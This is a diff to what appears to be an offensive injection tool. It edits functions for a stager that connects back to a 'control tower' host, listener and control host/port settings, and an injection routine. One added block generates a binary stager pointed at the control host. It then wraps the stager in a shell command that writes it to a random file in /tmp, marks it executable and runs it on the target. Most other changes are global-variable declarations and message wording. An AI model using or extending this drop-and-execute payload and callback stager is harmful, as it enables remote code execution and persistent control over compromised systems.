@@ -83,11 +83,11 @@ def ON_STAGER_CONNECT(ct):
     global INJECT_SUCCESS
     INJECT_SUCCESS = True
 
-    # TODO
+    # TODO we are here
 
 
 def scrape():
-    global MONKEY
+    global URL, MONKEY
 
     if 'http' not in URL:
         print('scrape called but argument is not a valid url (missing http://?)')
@@ -106,7 +106,12 @@ def scrape():
 
 
 def monkey_inject():
+    global CUSTOM_NAMES
+    global INJECT_SUCCESS
+    global TARGET
+    global URL
     global MONKEY
+    global PL
 
     if not MONKEY and not not URL and not TARGET:
         print('URL present, TARGET isn\'t. Implicitly calling scrape()')
@@ -138,7 +143,7 @@ def check_LHOST_LPORT():
 
 
 def check_CHOST_CPORT():
-    global CHOST, CPORT
+    global CHOST, CPORT, STAGER_CONTROL_PORT
     if not CHOST:
         default = '127.0.0.1'
         CHOST = default
@@ -149,6 +154,8 @@ def check_CHOST_CPORT():
 
 
 def start_control_tower():
+    global CONTROL_TOWER, CHOST, STAGER_CONTROL_PORT, ON_STAGER_CONNECT
+
     CONTROL_TOWER = ControlTower(ip=CHOST, port=int(STAGER_CONTROL_PORT), success_cb=ON_STAGER_CONNECT)
 
     CONTROL_TOWER.start()
@@ -254,6 +261,10 @@ try:
                     print('To inject a command, element of CUSTOM_STAGES should be the command and element of CUSTOM_STAGE_TYPES should be cmd')
                     quit()
 
+                if not PL:
+                    check_CHOST_CPORT()
+                    PL = Generator.bin_stager(CHOST, CPORT)
+
                 n = randword(4)
                 PL = f'printf "{PL}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
 
@@ -274,7 +285,7 @@ try:
 
             if URL:  # scrape was called
                 if TARGET and 'INJECT' in TARGET:
-                    print('scrape and inject target cannot be called together. Choose one')
+                    print('scrape() and inject(target) cannot be called together. Choose one')
                     quit()
                 monkey_inject()
             elif TARGET and 'INJECT' in TARGET:
